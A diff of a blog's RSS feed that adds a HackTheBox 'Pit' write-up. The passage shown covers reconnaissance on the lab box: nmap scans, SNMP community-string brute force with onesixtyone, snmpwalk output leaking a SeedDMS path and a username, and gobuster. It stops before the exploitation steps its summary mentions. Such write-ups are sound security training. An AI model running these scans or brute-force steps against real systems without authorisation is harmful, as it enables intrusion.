@@ -5,7 +5,518 @@
     <link>https://fahmifj.github.io/tags/linux/</link>
     <description>Recent content in Linux on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Fri, 24 Sep 2021 19:11:30 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Wed, 13 Oct 2021 16:54:04 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Pit</title>
+      <link>https://fahmifj.github.io/hackthebox/pit/</link>
+      <pubDate>Wed, 13 Oct 2021 16:54:04 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/pit/</guid>
+      <description>As a medium difficulty box, Pit from Hack The Box has a well-designed enumeration flow.</description>
+      <content:encoded><![CDATA[<p>As a medium difficulty box, Pit from Hack The Box has a well-designed enumeration flow. It starts by enumerating SNMP to reveal a username and a hidden web path to a CMS called SeedDMS, where I can login with that username. The CMS is vulnerable to a remote code execution, allowing me to obtain a database password that I can then use on a <a href="https://cockpit-project.org/">Cockpit</a> instance. Enumerating the system from Cockpit&rsquo;s terminal reveals that each time a &ldquo;walk&rdquo; is performed, SNMP will execute a script. This script basically searches for and executes other scripts in a specific directory to which I have write access, allowing me to create a malicious script in there to gain root access.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>SNMP enumeration and exploitation</li>
+<li>SeedDMS exploitation</li>
+<li>Cockpit exploitation</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li>snmpwalk</li>
+<li>gobuster</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<h4 id="tcp">TCP</h4>
+<p>For TCP ports, <code>nmap</code> discovers 3 open ports: SSH on port 22, an NGINX web server on port 80, and a service that <code>nmap</code> identifies it as zeus-admin.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49» 
+$ nmap -p- --max-rate <span class="m">1000</span> -sV --reason -oA nmap/10-tcp-allport-pit 10.10.10.241
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-20 11:03 EDT
+Nmap scan report <span class="k">for</span> 10.10.10.241
+Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.079s latency<span class="o">)</span>.
+Not shown: <span class="m">65532</span> filtered ports
+Reason: <span class="m">65332</span> no-responses and <span class="m">200</span> admin-prohibiteds
+PORT     STATE SERVICE         REASON         VERSION
+22/tcp   open  ssh             syn-ack ttl <span class="m">63</span> OpenSSH 8.0 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+80/tcp   open  http            syn-ack ttl <span class="m">63</span> nginx 1.14.1
+9090/tcp open  ssl/zeus-admin? syn-ack ttl <span class="m">63</span>
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 401.69 seconds
+→ root@kali «pit» «10.10.14.49» 
+$ nmap -p22,80,9090 --max-rate <span class="m">1000</span> -sC -oA nmap/10-tcp-defaultsc-pit 10.10.10.241
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-20 11:12 EDT
+Nmap scan report <span class="k">for</span> 10.10.10.241
+Host is up <span class="o">(</span>0.16s latency<span class="o">)</span>.
+
+PORT     STATE SERVICE
+22/tcp   open  ssh
+<span class="p">|</span> ssh-hostkey: 
+<span class="p">|</span>   <span class="m">3072</span> 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span>   <span class="m">256</span> c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_  <span class="m">256</span> 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp   open  http
+<span class="p">|</span>_http-title: Test Page <span class="k">for</span> the Nginx HTTP Server on Red Hat Enterprise Linux
+9090/tcp open  zeus-admin
+<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dms-pit.htb/organizationName<span class="o">=</span>4cd9329523184b0ea52ba0d20a1a6f92/countryName<span class="o">=</span>US
+<span class="p">|</span> Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
+<span class="p">|</span> Not valid before: 2020-04-16T23:29:12
+<span class="p">|</span>_Not valid after:  2030-06-04T16:09:12
+<span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 4.39 seconds
+</code></pre></div><p>Also, <code>nmap</code> revealed a domain name <code>dms-pit.htb</code> from the SSL certificate on port 9090. I will add it to my <code>/etc/hosts</code> file</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49» 
+$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.241 dms-pit.htb pit.htb&#39;</span> &gt;&gt; /etc/hosts
+</code></pre></div><h4 id="udp">UDP</h4>
+<p>For UDP ports, <code>nmap</code> discovers an SNMP server on port 161 and reveals a domain name <code>pit.htb</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49» 
+$ nmap -sU -sV -n --top-ports <span class="m">20</span> -oA nmap/10-udp-top20-pit 10.10.10.241
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-20 11:18 EDT
+Nmap scan report <span class="k">for</span> 10.10.10.241
+Host is up <span class="o">(</span>0.074s latency<span class="o">)</span>.
+
+PORT      STATE         SERVICE      VERSION
+53/udp    open<span class="p">|</span>filtered domain
+67/udp    open<span class="p">|</span>filtered dhcps
+68/udp    filtered      dhcpc
+69/udp    open<span class="p">|</span>filtered tftp
+123/udp   open<span class="p">|</span>filtered ntp
+135/udp   open<span class="p">|</span>filtered msrpc
+137/udp   open<span class="p">|</span>filtered netbios-ns
+138/udp   filtered      netbios-dgm
+139/udp   open<span class="p">|</span>filtered netbios-ssn
+161/udp   open          snmp         SNMPv1 server<span class="p">;</span> net-snmp SNMPv3 server <span class="o">(</span>public<span class="o">)</span>
+162/udp   open<span class="p">|</span>filtered snmptrap
+445/udp   filtered      microsoft-ds
+500/udp   open<span class="p">|</span>filtered isakmp
+514/udp   filtered      syslog
+520/udp   open<span class="p">|</span>filtered route
+631/udp   open<span class="p">|</span>filtered ipp
+1434/udp  open<span class="p">|</span>filtered ms-sql-m
+1900/udp  filtered      upnp
+4500/udp  open<span class="p">|</span>filtered nat-t-ike
+49152/udp open<span class="p">|</span>filtered unknown
+Service Info: Host: pit.htb
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 18.21 seconds
+</code></pre></div><h3 id="poking-the-websites">Poking the websites</h3>
+<p>For HTTP, it seems only <code>dms-pit.htb</code> that serves different content.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49» 
+$ curl -s http://10.10.10.241/ <span class="p">|</span> wc -c                                 
+<span class="m">4057</span>
+→ root@kali «pit» «10.10.14.49» 
+$ curl -s http://pit.htb/ <span class="p">|</span> wc -c
+<span class="m">4057</span>
+→ root@kali «pit» «10.10.14.49» 
+$ curl -s http://dms-pit.htb/ <span class="p">|</span> wc -c
+<span class="m">169</span>
+</code></pre></div><p>For HTTPS on port 9090, it&rsquo;s all the same site.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49» 
+$ curl -s -k https://10.10.10.241:9090/ <span class="p">|</span> wc -c
+<span class="m">43548</span>
+→ root@kali «pit» «10.10.14.49» 
+$ curl -s -k https://pit.htb:9090/ <span class="p">|</span> wc -c
+<span class="m">43548</span>
+→ root@kali «pit» «10.10.14.49» 
+$ curl -s -k https://dms-pit.htb:9090/ <span class="p">|</span> wc -c
+<span class="m">43548</span>
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>On port 80, a NGINX default web page for REHL is shown here.</p>
+<p><div class="img-container"><img src="imgs/image-20210520224354684.png" alt="image-20210520224354684"  /></div>
+</p>
+<p>Running <code>gobuster</code> against this site doesn&rsquo;t really find something useful, and I couldn&rsquo;t find a critical vulnerability on <code>nginx 1.14.1</code>.</p>
+<h3 id="tcp-80---dms-pithtb">TCP 80 - dms-pit.htb</h3>
+<p>Heading to <code>dms-pit.htb</code> on port 80 shows a 403 forbidden error message.</p>
+<p><div class="img-container"><img src="imgs/image-20210520224457026.png" alt="image-20210520224457026"  /></div>
+</p>
+<p>For this site, <code>gobuster</code> actually found some files, but all of them returned with 403 status.</p>
+<h3 id="tcp-9090---website-https">TCP 9090 - Website (HTTPS)</h3>
+<p>On port 9090, there is a login page.</p>
+<p><div class="img-container"><img src="imgs/image-20210520225003343.png" alt="image-20210520225003343"  /></div>
+</p>
+<p>This login page is identified as an instance of <a href="https://cockpit-project.org/.">Cockpit</a>, a web-based interface for system administration.</p>
+<h4 id="searchsploit">Searchsploit</h4>
+<p>There is a security issue on GitHub which talks about SSRF:</p>
+<ul>
+<li><a href="https://github.com/cockpit-project/cockpit/issues/15077">https://github.com/cockpit-project/cockpit/issues/15077</a></li>
+</ul>
+<p>The researcher disclosed the issue in his blog.</p>
+<ul>
+<li><a href="https://docs.unsafe-inline.com/0day/cokpit-version-234-server-side-request-forgery-cve-2020-35850">https://docs.unsafe-inline.com/0day/cokpit-version-234-server-side-request-forgery-cve-2020-35850</a></li>
+</ul>
+<p>The researcher also provides a PoC, but it requires an account, so I will move on to the next service.</p>
+<h3 id="udp-161---snmp">UDP 161 - SNMP</h3>
+<p>From what <code>nmap</code> gave, I assume that this machine supports SNMPv1-SNMPv3. Based on what I read on <a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp">HackTricks</a>, to enumerate SNMP version 1, I need to know the community string name, and there are two types of it: <code>public</code> and <code>private</code>.</p>
+<p>The <code>public</code> community string normally grants read access, however <code>private</code> may grant you read/write access, even leading to <a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp/snmp-rce">remote code execution</a>.</p>
+<p>For SNMP version 1 and 2c, it is possible to identify a valid community string with dictionary attack (brute) based on the server&rsquo;s response. In Kali, there is a preinstalled tool for this which I will use called <code>onesixtyone</code>. I will run it and save the ouput to a file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
+$ onesixtyone -c /opt/SecLists/Discovery/SNMP/snmp.txt 10.10.10.241 &gt; snmp-enum/brute-community-strings
+</code></pre></div><p>The attack reveals that <strong>public</strong> is a valid community string.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
+$ cat snmp-enum/brute-community-strings
+Scanning <span class="m">1</span> hosts, <span class="m">3220</span> communities
+10.10.10.241 <span class="o">[</span>public<span class="o">]</span> Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 <span class="c1">#1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64</span>
+10.10.10.241 <span class="o">[</span>public<span class="o">]</span> Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 <span class="c1">#1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64</span>
+</code></pre></div><p>Now to enumerate SNMP, I will use another preinstalled tool called <code>snmpwalk</code>. Using this tool will return a list of <a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp#oids">OID (Objects Identifiers)</a> which consists a set of numbers separated by dot, so to translate these numbers into a bit meaningful, I will need <code>snmp-mibs-downloader</code>. I will install that with:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
+$ apt-get install snmp-mibs-downloader
+</code></pre></div><p>The general usage for <code>snmpwalk</code> is:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ snmpwalk <span class="o">[</span>OPTIONS<span class="o">]</span> AGENT <span class="o">[</span>OID<span class="o">]</span>
+</code></pre></div><p>Actually, I did a lot of enumeration with SNMP, but because OID is a hierarchical structure, I found that it was easier to start from the Internet OID, which is <code>1.3.6.1</code>, so that it would  &ldquo;walk&rdquo; down to any readable OID branch, it is something like <code>1.3.6.1</code> -&gt; <code>1.3.6.1.1</code> (directory OID) -&gt; &hellip; -&gt;  <code>1.3.6.1.4</code> (private OID) -&gt; &hellip; -&gt; <code>1.3.6.1.X.X</code>.</p>
+<p>I will run <code>snmpwalk</code> on that and save the output to <code>snmp-internet-1.3.6.1.out</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
+$ snmpwalk -v 2c -c public 10.10.10.241 internet &gt; snmp-internet-1.3.6.1.out
+</code></pre></div><ul>
+<li><code>-v</code> 2c: SNMP version 2c. SNMP version 1 and 2c sends data in clear-text while version 3 uses auth.</li>
+<li><code>-c</code> public: community string</li>
+<li><code>internet</code>: auto translated to 1.3.6.1 by <code>snmp-mibs-downloader</code></li>
+</ul>
+<p>I will filter the output with <code>hrSWRunParameters</code> (Host Resources Software Run Parameters), which might leak some sensitive information from the command line arguments of the current running processes, but it doesn&rsquo;t have any.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
+$ cat snmp-enum/snmp-internet-1.3.6.1.out <span class="p">|</span> grep <span class="s2">&#34;hrSWRunParameters&#34;</span> <span class="p">|</span> grep STRING
+HOST-RESOURCES-MIB::hrSWRunParameters.1 <span class="o">=</span> STRING: <span class="s2">&#34;--switched-root --system --deserialize 17&#34;</span>
+HOST-RESOURCES-MIB::hrSWRunParameters.1000 <span class="o">=</span> STRING: <span class="s2">&#34;--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only&#34;</span>
+HOST-RESOURCES-MIB::hrSWRunParameters.1001 <span class="o">=</span> STRING: <span class="s2">&#34;--foreground&#34;</span>
+HOST-RESOURCES-MIB::hrSWRunParameters.1002 <span class="o">=</span> STRING: <span class="s2">&#34;--no-debug&#34;</span>
+HOST-RESOURCES-MIB::hrSWRunParameters.1004 <span class="o">=</span> STRING: <span class="s2">&#34;-s&#34;</span>
+HOST-RESOURCES-MIB::hrSWRunParameters.1009 <span class="o">=</span> STRING: <span class="s2">&#34;-i --logger=files&#34;</span>
+HOST-RESOURCES-MIB::hrSWRunParameters.1011 <span class="o">=</span> STRING: <span class="s2">&#34;-f --fill-watermark=0&#34;</span>
+HOST-RESOURCES-MIB::hrSWRunParameters.1041 <span class="o">=</span> STRING: <span class="s2">&#34;--domain implicit_files --uid 0 --gid 0 --logger=files&#34;</span>
+HOST-RESOURCES-MIB::hrSWRunParameters.1051 <span class="o">=</span> STRING: <span class="s2">&#34;--uid 0 --gid 0 --logger=files&#34;</span>
+HOST-RESOURCES-MIB::hrSWRunParameters.1056 <span class="o">=</span> STRING: <span class="s2">&#34;-s /usr/sbin/firewalld --nofork --nopid&#34;</span>
+HOST-RESOURCES-MIB::hrSWRunParameters.1090 <span class="o">=</span> STRING: <span class="s2">&#34;--no-daemon&#34;</span>
+HOST-RESOURCES-MIB::hrSWRunParameters.1101 <span class="o">=</span> STRING: <span class="s2">&#34;-D -oCiphers=aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes256-ctr,aes256-cbc,aes128-gcm@openssh.com,aes128-ctr,aes128&#34;</span>
+HOST-RESOURCES-MIB::hrSWRunParameters.1105 <span class="o">=</span> STRING: <span class="s2">&#34;-Es /usr/sbin/tuned -l -P&#34;</span>
+HOST-RESOURCES-MIB::hrSWRunParameters.1116 <span class="o">=</span> STRING: <span class="s2">&#34;-n&#34;</span>
+HOST-RESOURCES-MIB::hrSWRunParameters.1193 <span class="o">=</span> STRING: <span class="s2">&#34;-o -p -- \\u --noclear tty1 linux&#34;</span>
+HOST-RESOURCES-MIB::hrSWRunParameters.1208 <span class="o">=</span> STRING: <span class="s2">&#34;--basedir=/usr&#34;</span>
+HOST-RESOURCES-MIB::hrSWRunParameters.1479 <span class="o">=</span> STRING: <span class="s2">&#34;-n&#34;</span>
+HOST-RESOURCES-MIB::hrSWRunParameters.1481 <span class="o">=</span> STRING: <span class="s2">&#34;-LS0-6d -f&#34;</span>
+HOST-RESOURCES-MIB::hrSWRunParameters.10212 <span class="o">=</span> STRING: <span class="s2">&#34;-Es /usr/share/setroubleshoot/SetroubleshootFixit.py&#34;</span>
+</code></pre></div><p>If I examine the full output carefully, the two most interesting information are:</p>
+<ul>
+<li>A web path <code>/var/www/html/seeddms51x/seeddms</code>, and</li>
+<li>A potential username: <code>michelle</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">UCD-SNMP-MIB::dskPath.2 <span class="o">=</span> STRING: /var/www/html/seeddms51x/seeddms
+UCD-SNMP-MIB::dskDevice.1 <span class="o">=</span> STRING: /dev/mapper/cl-root
+UCD-SNMP-MIB::dskDevice.2 <span class="o">=</span> STRING: /dev/mapper/cl-seeddms
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 <span class="o">=</span> INTEGER: <span class="m">1</span>
+NET-SNMP-EXTEND-MIB::nsExtendCommand.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> STRING: /usr/bin/monitor
+NET-SNMP-EXTEND-MIB::nsExtendArgs.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendInput.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendCacheTime.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: <span class="m">5</span>
+NET-SNMP-EXTEND-MIB::nsExtendExecType.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: exec<span class="o">(</span>1<span class="o">)</span>
+NET-SNMP-EXTEND-MIB::nsExtendRunType.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: run-on-read<span class="o">(</span>1<span class="o">)</span>
+NET-SNMP-EXTEND-MIB::nsExtendStorage.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: permanent<span class="o">(</span>4<span class="o">)</span>
+NET-SNMP-EXTEND-MIB::nsExtendStatus.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: active<span class="o">(</span>1<span class="o">)</span>
+NET-SNMP-EXTEND-MIB::nsExtendOutput1Line.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> STRING: Memory usage
+NET-SNMP-EXTEND-MIB::nsExtendOutputFull.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> STRING: Memory usage
+              total        used        free      shared  buff/cache   available
+Mem:          3.8Gi       415Mi       3.0Gi        16Mi       452Mi       3.2Gi
+Swap:         1.9Gi          0B       1.9Gi
+Database status
+OK - Connection to database successful.
+System release info
+CentOS Linux release 8.3.2011
+SELinux Settings
+user
+
+                Labeling   MLS/       MLS/                          
+SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles
+
+guest_u         user       s0         s0                             guest_r
+root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
+staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
+sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
+system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
+unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
+user_u          user       s0         s0                             user_r
+xguest_u        user       s0         s0                             xguest_r
+login
+
+Login Name           SELinux User         MLS/MCS Range        Service
+
+__default__          unconfined_u         s0-s0:c0.c1023       *
+michelle             user_u               s0                   *
+root                 unconfined_u         s0-s0:c0.c1023       *
+System uptime
+ 14:03:52 up 12:03,  <span class="m">0</span> users,  load average: 0.04, 0.01, 0.00
+NET-SNMP-EXTEND-MIB::nsExtendOutNumLines.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: <span class="m">31</span>
+NET-SNMP-EXTEND-MIB::nsExtendResult.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: <span class="m">0</span>
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.1 <span class="o">=</span> STRING: Memory usage
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.2 <span class="o">=</span> STRING:               total        used        free      shared  buff/cache   available
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.3 <span class="o">=</span> STRING: Mem:          3.8Gi       415Mi       3.0Gi        16Mi       452Mi       3.2Gi
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.4 <span class="o">=</span> STRING: Swap:         1.9Gi          0B       1.9Gi
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.5 <span class="o">=</span> STRING: Database status
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.6 <span class="o">=</span> STRING: OK - Connection to database successful.
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.7 <span class="o">=</span> STRING: System release info
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.8 <span class="o">=</span> STRING: CentOS Linux release 8.3.2011
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.9 <span class="o">=</span> STRING: SELinux Settings
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.10 <span class="o">=</span> STRING: user
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.11 <span class="o">=</span> STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.12 <span class="o">=</span> STRING:                 Labeling   MLS/       MLS/                          
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.13 <span class="o">=</span> STRING: SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.14 <span class="o">=</span> STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.15 <span class="o">=</span> STRING: guest_u         user       s0         s0                             guest_r
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.16 <span class="o">=</span> STRING: root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.17 <span class="o">=</span> STRING: staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.18 <span class="o">=</span> STRING: sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.19 <span class="o">=</span> STRING: system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.20 <span class="o">=</span> STRING: unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.21 <span class="o">=</span> STRING: user_u          user       s0         s0                             user_r
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.22 <span class="o">=</span> STRING: xguest_u        user       s0         s0                             xguest_r
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.23 <span class="o">=</span> STRING: login
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.24 <span class="o">=</span> STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.25 <span class="o">=</span> STRING: Login Name           SELinux User         MLS/MCS Range        Service
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.26 <span class="o">=</span> STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.27 <span class="o">=</span> STRING: __default__          unconfined_u         s0-s0:c0.c1023       *
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.28 <span class="o">=</span> STRING: michelle             user_u               s0                   *
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.29 <span class="o">=</span> STRING: root                 unconfined_u         s0-s0:c0.c1023       *
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.30 <span class="o">=</span> STRING: System uptime
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.31 <span class="o">=</span> STRING:  14:03:52 up 12:03,  <span class="m">0</span> users,  load average: 0.04, 0.01, 0.00
+NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.31 <span class="o">=</span> No more variables left in this MIB View <span class="o">(</span>It is past the end of the MIB tree<span class="o">)</span>
+</code></pre></div><p>I will also notice that some of the output lines starting with <code>NET-SNMP-EXTEND-MIB</code> are similar to the output from some Linux command utilities such as <code>uptime</code> and <code>free -h</code>.</p>
+<h3 id="seeddms-tcp-80">SeedDMS (TCP 80)</h3>
+<p>From the enumeration above, a web directory was revealed at <code>/var/www/html/seeddms51x/seeddms</code> by <code>snmpwalk</code>. Since the directory path contains a &ldquo;dms&rdquo; string, I tried to append the path name to <code>http://dms-pit.htb</code>.</p>
+<p>And then when I enter <code>http://dms-pit.htb/seeddms51x/seeddms</code>, it redirects me to a login page.</p>
+<p><div class="img-container"><img src="imgs/image-20210521014642036.png" alt="image-20210521014642036"  /></div>
+</p>
+<p>A quick search for &ldquo;SeedDMS&rdquo; on Google pops <a href="https://www.seeddms.org/index.php?id=2">this link</a>. It states that SeedDMS is:</p>
+<blockquote>
+<p>A free document management system with an easy to use web  based user interface for small and medium sized enterprises. It is based on PHP and MySQL or sqlite3 and runs on Linux, MacOS and Windows. Many  years of development has made it a mature, powerful and enterprise ready platform for sharing and storing documents.</p>
+</blockquote>
+<h4 id="gobuster">Gobuster</h4>
+<p>This time <code>gobuster</code> reveals some accessible items.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
+$ gobuster dir -u http://dms-pit.htb/seeddms51x/seeddms/ -x txt,php -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/dms-pit.htb-seeddms-M-80 -t <span class="m">10</span> -b 403,404 -r
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+<span class="o">]</span> Url:                     http://dms-pit.htb/seeddms51x/seeddms/
+<span class="o">[</span>+<span class="o">]</span> Method:                  GET
+<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
+<span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
+<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   403,404
+<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
+<span class="o">[</span>+<span class="o">]</span> Extensions:              txt,php
+<span class="o">[</span>+<span class="o">]</span> Follow Redirect:         <span class="nb">true</span>
+<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+<span class="o">===============================================================</span>
+2021/05/20 15:13:54 Starting gobuster in directory enumeration <span class="nv">mode</span>
+<span class="o">===============================================================</span>
+/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 7359<span class="o">]</span>
+/CHANGELOG            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 101652<span class="o">]</span>
+/LICENSE              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 18321<span class="o">]</span>
